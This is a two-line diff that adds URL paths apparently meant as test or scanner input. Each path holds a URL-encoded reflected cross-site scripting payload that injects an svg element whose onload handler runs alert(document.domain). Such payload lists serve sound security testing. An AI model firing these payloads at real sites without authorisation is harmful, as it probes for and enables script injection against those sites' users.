@@ -1,0 +1,2 @@
+/page/hello/1%22%3E%3Csvg/onload=alert(document.domain)%3E
+/page/1%22%3E%3Csvg/onload=alert(document.domain)%3E
